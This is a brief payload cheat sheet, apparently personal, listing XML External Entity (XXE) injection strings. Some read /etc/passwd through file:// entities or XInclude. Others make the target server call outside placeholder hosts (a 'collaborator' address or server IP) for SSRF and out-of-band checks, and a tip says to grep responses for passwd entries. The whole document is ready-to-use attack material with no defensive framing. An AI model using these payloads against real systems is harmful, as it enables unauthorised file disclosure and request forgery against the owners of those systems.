# My xxe payload
Coded by: RobinTrigon | 3rr0r-404
-----------------------------------------------------------------------------------------------------------------------------------------------------------
### Exploiting XXE using external entities to retrieve files
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
### XXE to perform SSRF attacks
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://sarver-ip/"> ]>
```
### XXE TO SSRF
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://colabrator/"> ]>

```
### Entities are not allowed
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://colabrator/"> ]>

```
### Entities are not allowed
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collabrator"> %xxe; ]> //dont call xxe

```
### must try
```
<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY sp SYSTEM "https://collabretor/">]><r>&xxe;&sp;</r>
```

### Peram Based
#### Just replace any peramiter with it and egrep "root:x|daemon:x"
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
